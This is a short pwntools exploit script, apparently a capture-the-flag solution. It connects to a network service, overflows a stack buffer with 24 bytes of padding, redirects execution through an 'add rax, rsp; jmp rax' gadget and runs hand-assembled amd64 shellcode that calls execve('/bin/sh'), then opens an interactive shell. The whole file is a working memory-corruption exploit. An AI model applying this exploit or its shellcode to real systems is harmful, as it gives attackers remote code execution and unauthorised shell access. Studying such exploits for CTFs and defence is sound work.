from pwn import *
context.arch = "amd64"
r = remote("192.168.44.1", 5000)
# r = gdb.debug("./challx", gdbscript="break *0x00000000004011cd")
p = b"a"*24
p += p64(0x000000000040115e)# : add rax, rsp ; jmp rax
p += asm("""
	mov rax, 0x68732f6e69622f;
	push rax;
	push rsp;
	pop rdi;
	xor eax, eax;
	push rax;
	mov al, 59;
	push rsp;
	pop rdx;
	push rsp;
	pop rsi;
	syscall;
""")
r.sendline(p)
r.interactive()
